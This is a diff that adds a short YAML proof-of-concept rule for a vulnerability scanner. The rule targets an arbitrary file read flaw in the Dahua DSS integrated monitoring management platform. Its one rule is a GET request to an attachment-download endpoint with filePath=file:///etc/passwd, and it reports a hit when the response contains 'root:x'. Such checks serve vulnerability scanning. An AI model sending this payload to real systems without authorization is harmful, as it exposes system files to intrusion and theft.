@@ -1,0 +1,11 @@
+name: poc-yaml-大华DSS综合监控管理平台-Diretory
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+    expression:
+      status: 200
+      body_all: ["root:x"]
